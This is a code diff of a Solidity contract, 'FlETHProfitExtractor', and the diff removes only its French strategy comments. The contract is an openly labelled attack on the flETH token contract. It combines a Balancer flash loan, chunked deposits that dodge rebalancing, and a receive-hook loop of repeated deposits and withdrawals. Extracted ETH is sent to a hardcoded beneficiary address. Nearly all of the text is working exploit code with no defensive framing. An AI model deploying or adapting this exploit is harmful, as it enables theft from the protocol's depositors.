@@ -1,16 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.26;
 
-/**
- * @title FlETH Profit Extractor
- * @notice Extrait et garde progressivement des ETH au lieu de tout recirculer
- *
- * STRATÉGIE:
- * 1. Éviter le rebalance automatique en déposant par tranches
- * 2. Garder un pourcentage croissant à chaque cycle
- * 3. Exploiter la différence entre ce qu'on dépose et ce qu'on retire
- */
-
 interface IFLETHStrategy {
     function balanceInETH() external view returns (uint256);
 }
@@ -46,9 +36,7 @@ contract FlETHProfitExtractor {
     IFLETH public constant flETH = IFLETH(0x000000000D564D5be76f7f0d28fE52605afC7Cf8);
     IBalancerVault public constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IWETH public constant WETH = IWETH(0x4200000000000000000000000000000000000006);
-
     address public constant BENEFICIARY = 0x161B2CA2f65a4b8bfd4317569b2Fc386CFB2A1A0;
-
     uint256 public constant FLASHLOAN_AMOUNT = 100 ether;
     uint256 public constant MAX_CYCLES = 15;
 
@@ -57,13 +45,11 @@ contract FlETHProfitExtractor {
     bool private isExtracting;
     uint256 private cycleCount;
 
-    // Tracking profits
     uint256 public totalDeposited;
     uint256 public totalWithdrawn;
     uint256 public profitSecured;
     uint256 public netProfit;
 
-    // Keep percentage per cycle (increases progressively)
     uint256[15] public keepPercentages = [
         10, 15, 20, 25, 30, 35, 40, 45, 50, 55, 60, 65, 70, 75, 80
     ];
@@ -87,14 +73,11 @@ contract FlETHProfitExtractor {
         attackExecuted = true;
 
         emit AttackStarted(FLASHLOAN_AMOUNT);
-
-        // Initier le flashloan
         address[] memory tokens = new address[](1);
         tokens[0] = address(WETH);
 
         uint256[] memory amounts = new uint256[](1);
         amounts[0] = FLASHLOAN_AMOUNT;
-
         balancerVault.flashLoan(address(this), tokens, amounts, "");
     }
 
@@ -108,8 +91,6 @@ contract FlETHProfitExtractor {
         require(feeAmounts[0] == 0, "Expected 0% fee");
 
         uint256 flashAmount = amounts[0];
-
-        // Unwrap WETH -> ETH
         WETH.withdraw(flashAmount);
 
         isExtracting = true;
@@ -118,19 +99,14 @@ contract FlETHProfitExtractor {
         totalWithdrawn = 0;
         profitSecured = 0;
 
-        // STRATÉGIE ANTI-REBALANCE:
-        // Déposer en plusieurs tranches pour éviter le rebalance automatique
         _smartDeposit(flashAmount);
 
-        // Maintenant, retirer tout d'un coup pour maximiser l'extraction
         uint256 ourFlETH = flETH.balanceOf(address(this));
         if (ourFlETH > 0) {
             flETH.withdraw(ourFlETH);
         }
 
         isExtracting = false;
-
-        // Calculer le profit net
         uint256 finalBalance = address(this).balance;
         if (finalBalance > flashAmount) {
             netProfit = finalBalance - flashAmount;
@@ -139,8 +115,6 @@ contract FlETHProfitExtractor {
         }
 
         emit AttackCompleted(totalWithdrawn, profitSecured, netProfit);
-
-        // Rembourser le flashloan
         uint256 toRepay = flashAmount;
         if (address(this).balance < toRepay) {
             toRepay = address(this).balance; // Repayer ce qu'on peut
@@ -148,8 +122,6 @@ contract FlETHProfitExtractor {
 
         WETH.deposit{value: toRepay}();
         WETH.transfer(address(balancerVault), toRepay);
-
-        // Envoyer le profit au bénéficiaire
         uint256 remaining = address(this).balance;
         if (remaining > 0) {
             (bool success,) = BENEFICIARY.call{value: remaining}("");
@@ -158,31 +130,25 @@ contract FlETHProfitExtractor {
     }
 
     function _smartDeposit(uint256 totalAmount) internal {
-        // Calculer le seuil de rebalance
         uint256 totalSupply = flETH.totalSupply();
         uint256 threshold = flETH.rebalanceThreshold();
         uint256 currentBalance = address(flETH).balance;
         uint256 rebalanceLimit = (threshold * (totalSupply + totalAmount)) / 1 ether;
 
-        // Option 1: Si on peut déposer sans déclencher rebalance
         if (currentBalance + totalAmount <= rebalanceLimit) {
             flETH.deposit{value: totalAmount}(0);
             totalDeposited = totalAmount;
         } else {
-            // Option 2: Déposer en plusieurs fois pour éviter rebalance
             uint256 remaining = totalAmount;
             uint256 chunkSize = 10 ether;
 
             while (remaining > 0 && cycleCount < 10) {
                 uint256 toDeposit = remaining > chunkSize ? chunkSize : remaining;
-
-                // Vérifier si ce dépôt déclenchera un rebalance
                 uint256 newBalance = address(flETH).balance;
                 uint256 newSupply = flETH.totalSupply() + toDeposit;
                 uint256 newThreshold = (threshold * newSupply) / 1 ether;
 
                 if (newBalance + toDeposit > newThreshold) {
-                    // Ce dépôt déclencherait un rebalance, réduire le montant
                     toDeposit = newThreshold > newBalance ? newThreshold - newBalance : 0;
                 }
 
@@ -211,36 +177,23 @@ contract FlETHProfitExtractor {
         uint256 received = msg.value;
         totalWithdrawn += received;
 
-        // STRATÉGIE DE PROFIT:
-        // Garder un pourcentage croissant à chaque cycle
         uint256 keepPercentage = cycleCount < 15 ? keepPercentages[cycleCount - 1] : 80;
         uint256 toKeep = (received * keepPercentage) / 100;
         uint256 toRedeposit = received - toKeep;
-
         profitSecured += toKeep;
-
         emit CycleExecuted(cycleCount, received, toKeep, toRedeposit);
-
-        // Conditions pour continuer:
-        // 1. On a encore des fonds à redéposer
-        // 2. On n'a pas atteint la limite de cycles
-        // 3. Le montant est significatif
         if (toRedeposit > 0.1 ether && cycleCount < MAX_CYCLES) {
-            // Redéposer une partie pour continuer l'extraction
             flETH.deposit{value: toRedeposit}(0);
             totalDeposited += toRedeposit;
 
             uint256 newFlETH = flETH.balanceOf(address(this));
             if (newFlETH > 0) {
-                // Nouveau cycle de withdraw
                 try flETH.withdraw(newFlETH) {
-                    // Continue l'extraction
                 } catch {
-                    // Si échec, on garde ce qu'on a
+
                 }
             }
         } else {
-            // Arrêter l'extraction et garder les profits
             emit ProfitSecured(profitSecured);
         }
     }
